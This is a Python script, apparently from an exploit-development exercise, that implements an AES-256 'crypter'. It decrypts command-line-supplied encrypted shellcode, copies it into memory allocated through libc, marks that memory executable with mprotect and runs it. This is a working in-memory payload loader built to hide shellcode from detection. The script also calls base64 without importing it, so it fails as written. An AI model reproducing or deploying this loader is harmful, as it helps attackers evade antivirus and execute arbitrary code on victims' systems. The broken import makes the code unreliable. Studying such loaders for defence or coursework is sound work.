#Crypter AES - 256
#Author : goutham madhwaraj
#website : https://barriersec.com
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
from ctypes import *
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-k', "--key", help='secret key used to decrypt shellcode')
parser.add_argument('-e', "--shellcode", help='encrypted shellcode should be a string')

args = parser.parse_args()

if args.key == None and args.shellcode == None :
    parser.print_help()
    exit()

print("Pycrypto AES-256 crypter\n")

secret = args.key
shellcode = args.shellcode.encode()


print("provided key :\t",secret,"\n")
print("encoded shellcode :\t",shellcode,"\n")

BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def decrypt(enc, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[16:]))


decrypted = decrypt(shellcode, secret)
exec_shellcode = bytes.decode(decrypted)
print("decoded shellcode....\n")
print(exec_shellcode)

value2 = bytes(exec_shellcode,"ISO-8859-1")

byte_shellcode = value2.decode('unicode-escape').encode('ISO-8859-1')
print(byte_shellcode)

libc = CDLL('libc.so.6')
sc_addr = c_char_p(byte_shellcode)
size = len(byte_shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc_addr, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
